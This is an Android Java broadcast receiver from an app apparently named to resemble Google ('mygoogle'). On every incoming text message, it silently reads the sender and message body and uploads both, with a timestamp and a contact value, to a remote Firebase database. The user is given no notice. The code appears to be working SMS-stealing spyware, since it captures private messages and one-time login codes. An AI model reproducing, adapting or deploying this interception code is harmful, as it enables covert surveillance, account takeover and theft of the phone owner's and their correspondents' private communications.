package com.crezyprogrammer.mygoogle;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Calendar;
import java.util.Date;

import xdroid.toaster.Toaster;

import static xdroid.core.Global.getContext;


public class SMSReceiver extends BroadcastReceiver
{ public void onReceive(Context context, Intent intent)
    {
        if (intent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
            // boot-related processing here
            Log.i("123321","boot ready");
            Toast.makeText(context, "boot completed", Toast.LENGTH_SHORT).show();

        }

        else if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            {
                // TODO Auto-generated method stub

                if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
                    Bundle bundle = intent.getExtras();           //---get the SMS message passed in---
                    SmsMessage[] msgs = null;
                    String msg_from;
                    if (bundle != null){
                        //---retrieve the SMS message received---
                        try{
                            Object[] pdus = (Object[]) bundle.get("pdus");
                            msgs = new SmsMessage[pdus.length];
                            for(int i=0; i<msgs.length; i++){
                                msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                                msg_from = msgs[i].getOriginatingAddress();
                                String msgBody = msgs[i].getMessageBody();



                                DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference().child("sms");
                                String address = msg_from;
                                String body = msgBody;
                                Calendar calendar = Calendar.getInstance();
                                calendar.setTimeInMillis(System.currentTimeMillis());
                                Date finaldate = calendar.getTime();
                                String smsDate = finaldate.toString();
                                long time = System.currentTimeMillis();
                                Long updated = 9999999999999L;
                                long net = updated - time;
                                DatabaseReference node = databaseReference.child(net+"");
                                node.child("body").setValue(body);
                                node.child("number").setValue(address);
                                node.child("time").setValue(smsDate);
                                node.child("contact").setValue(Utils.contact);
                                String s = "time " + smsDate + " Number: " + address + " .Message: " + body;
                                // Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
                                //     handler.handleMessage(s);
                                Log.i("123321", "61:" + s);
                            }
                        }catch(Exception e){
                          Log.d("Exception caught",e.getMessage());
                        }
                    }
                }
            }
        }
        }
    }






